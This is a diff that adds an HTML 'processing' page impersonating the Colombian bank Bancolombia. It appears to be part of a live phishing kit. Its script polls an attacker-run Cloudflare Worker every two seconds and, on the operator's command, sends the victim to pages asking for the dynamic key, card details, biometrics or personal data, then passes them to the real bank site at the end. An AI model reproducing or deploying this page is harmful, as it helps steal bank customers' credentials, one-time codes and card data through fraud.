@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual - Procesando</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f0f2f500;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* ✅ Solo logo y círculo de carga */
+        .loading-box {
+            text-align: center;
+        }
+
+        .logo img {
+            height: 50px;
+            margin-bottom: 30px;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #F9A825;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-box">
+        <!-- Logo Bancolombia -->
+        <div class="logo">
+            <img src="gitcol.gif" alt="Bancolombia">
+        </div>
+        <!-- Círculo de carga -->
+        <div class="loader"></div>
+    </div>
+
+    <script>
+    const WORKER_URL = "https://ancient-dawn-3a7e.perrayolo11.workers.dev";
+    let transactionId = localStorage.getItem('transactionId');
+    let startTime = Date.now();
+    let intervalId = null;
+
+    function updateStatus(message) {
+        console.log("📌 Estado:", message);
+    }
+
+    function updateProgress(percentage) {
+        // Sin barra de progreso
+    }
+
+    function updateTimer() {
+        // Sin timer
+    }
+
+    if (!transactionId) {
+        setTimeout(() => window.location.href = "index.html", 2000);
+    } else {
+        intervalId = setInterval(async () => {
+            try {
+                const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
+                const data = await response.json();
+                
+                console.log("📨 Respuesta:", data.estado);
+                
+                if (data.estado && data.estado !== "pendiente" && data.estado !== "dinamica_recibida" && data.estado !== "tarjeta_recibida" && data.estado !== "biometria_recibida") {
+                    clearInterval(intervalId);
+                    
+                    const acciones = {
+                        "autorizado": { url: "cel-dina.html", delay: 1500 },
+                        "error_dinamica": { url: "cel-dina-error.html", delay: 1500 },
+                        "error_usuario": { url: "erroruser.html", delay: 2000 },
+                        "biometria": { url: "biometria.html", delay: 1500 },
+                        "finalizado": { url: "https://www.bancolombia.co", delay: 2000 },
+                        "reintentar": { url: "tarjeta.html", delay: 1500 },
+                        "soporte": { url: "923.html", delay: 2000 },
+                        "ayuda": { url: "datos.html", delay: 2000 }
+                    };
+                    
+                    const accion = acciones[data.estado] || { url: "index.html", delay: 2000 };
+                    
+                    setTimeout(() => {
+                        window.location.href = accion.url;
+                    }, accion.delay);
+                }
+            } catch (error) {
+                console.error("Error en polling:", error);
+            }
+        }, 2000);
+        
+        setTimeout(() => {
+            if (intervalId) {
+                clearInterval(intervalId);
+                setTimeout(() => window.location.href = "index.html", 2000);
+            }
+        }, 300000);
+    }
+    </script>
+</body>
+</html>
